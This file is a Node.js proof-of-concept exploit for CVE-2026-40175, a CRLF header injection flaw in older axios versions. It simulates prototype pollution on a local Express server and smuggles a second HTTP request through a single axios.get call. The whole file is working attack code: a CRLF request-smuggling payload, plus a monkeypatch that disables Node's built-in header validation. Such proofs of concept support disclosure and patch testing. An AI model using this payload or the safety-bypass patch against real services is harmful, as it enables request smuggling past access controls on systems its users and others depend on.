'use strict';

const http = require('http');
const express = require('express');
const axios = require('axios');

const PORT = 3000;

// -------------------------------------------------------------------
// Bypass Node.js's header-value CRLF validation.
//
// Modern Node.js (>=14) rejects \r\n in header values inside
// http.OutgoingMessage.setHeader().  The CVE-2026-40175 bug is that
// *axios itself* never sanitises header values — it relies entirely
// on the runtime to catch them.  Runtimes without this guard (older
// Node, Deno, Bun, browser XHR, …) are directly exploitable.
//
// We patch setHeader() so that when Node throws on a CRLF value the
// header is stored anyway, isolating the axios-level vulnerability.
// -------------------------------------------------------------------
const _probe = new http.OutgoingMessage();
_probe.setHeader('__probe', 'v');
const kOutHeaders = Object.getOwnPropertySymbols(_probe).find((s) => {
  const v = _probe[s];
  return v && typeof v === 'object' && '__probe' in v;
});

if (!kOutHeaders) {
  console.error('Could not locate kOutHeaders symbol – PoC requires Node.js >=14');
  process.exit(1);
}

const _origSetHeader = http.OutgoingMessage.prototype.setHeader;
http.OutgoingMessage.prototype.setHeader = function (name, value) {
  try {
    return _origSetHeader.call(this, name, value);
  } catch {
    if (this[kOutHeaders] === null) this[kOutHeaders] = Object.create(null);
    this[kOutHeaders][name.toLowerCase()] = [name, value];
    return this;
  }
};
// -------------------------------------------------------------------

const app = express();
const hits = [];

app.get('/endpoint-b', (req, res) => {
  hits.push('B');
  console.log('  [ENDPOINT B] Legitimate request received');
  res.json({ endpoint: 'B', status: 'ok' });
});

app.get('/endpoint-c', (req, res) => {
  hits.push('C');
  console.log('  [ENDPOINT C] *** SMUGGLED REQUEST ***');
  res.json({ endpoint: 'C', status: 'smuggled' });
});

app.get('/endpoint-a', async (req, res) => {
  hits.length = 0;

  const axiosVersion = axios.VERSION || require('axios/package.json').version;

  console.log('\n' + '='.repeat(60));
  console.log(' CVE-2026-40175 PoC – Axios CRLF Header Injection');
  console.log(' axios %s  (vulnerable: < 1.15.0)', axiosVersion);
  console.log('='.repeat(60));

  // ── Step 1: Prototype pollution ──────────────────────────────
  // In a real attack this comes from a separate vulnerable library
  // (qs, minimist, body-parser …).  We do it manually here.
  console.log('\n[1] Simulating prototype pollution …');

  const payload =
    `legit\r\n\r\nGET /endpoint-c HTTP/1.1\r\nHost: localhost:${PORT}`;

  Object.prototype['x-polluted'] = payload;
  console.log('    Object.prototype["x-polluted"] = <CRLF payload>');

  // ── Step 2: Header merge via for…in ──────────────────────────
  // Any code that iterates a plain object with for…in will pick up
  // the polluted key.  The CRLF value is captured as an *own*
  // property of the merged object.
  console.log('\n[2] Merging headers (for…in picks up pollution) …');

  const defaults = { Accept: 'text/html' };
  const merged = { Host: `localhost:${PORT}` };
  for (const key in defaults) {
    merged[key] = defaults[key];
    const display = String(defaults[key]).replace(/\r/g, '\\r').replace(/\n/g, '\\n');
    const tag = key === 'x-polluted' ? '  ← INJECTED!' : '';
    console.log('    %s: %s%s', key, display, tag);
  }

  // Clean up pollution immediately — the payload is already captured
  // in `merged` as an own property, just like a real exploit scenario.
  delete Object.prototype['x-polluted'];

  // ── Step 3: axios.get() with the polluted headers ────────────
  // Axios < 1.15.0 passes header values through normalizeValue()
  // which does NOT strip CRLF → the payload reaches the wire.
  console.log('\n[3] axios.get("http://localhost:%d/endpoint-b", { headers }) …', PORT);

  const agent = new http.Agent({ keepAlive: true });
  try {
    const resp = await axios.get(`http://localhost:${PORT}/endpoint-b`, {
      headers: merged,
      httpAgent: agent,
    });
    console.log('    → axios response: %d %j', resp.status, resp.data);
  } catch (err) {
    console.log('    → axios error: %s', err.message);
  }
  agent.destroy();

  await new Promise((r) => setTimeout(r, 500));

  // ── Result ───────────────────────────────────────────────────
  const exploited = hits.includes('B') && hits.includes('C');

  console.log('\n[Result]');
  console.log('  Endpoints hit: %j', hits);
  if (exploited) {
    console.log('  ✓ EXPLOIT SUCCEEDED – one axios.get() to /endpoint-b');
    console.log('    also smuggled a request to /endpoint-c!\n');
  } else {
    console.log('  ✗ Smuggling did not trigger.\n');
  }
  console.log('='.repeat(60) + '\n');

  res.json({
    vulnerability: 'CVE-2026-40175',
    axios_version: axiosVersion,
    endpoints_hit: [...hits],
    exploit_successful: exploited,
    flow: [
      '1. Object.prototype polluted with CRLF header payload',
      '2. for…in merges the polluted key into a plain headers object',
      '3. Headers object passed to axios.get() as config.headers',
      '4. Axios stores the value via AxiosHeaders.set() → normalizeValue() (no CRLF check)',
      '5. Axios passes headers to http.request → setHeader() writes them to the socket',
      '6. The \\r\\n\\r\\n inside the value terminates the first request early',
      '7. The server HTTP parser sees a second request → /endpoint-c is hit',
    ],
  });
});

app.listen(PORT, () => {
  console.log('\nCVE-2026-40175 PoC Server');
  console.log('========================');
  console.log('Trigger : http://localhost:%d/endpoint-a', PORT);
  console.log('Target  : http://localhost:%d/endpoint-b', PORT);
  console.log('Smuggle : http://localhost:%d/endpoint-c\n', PORT);
});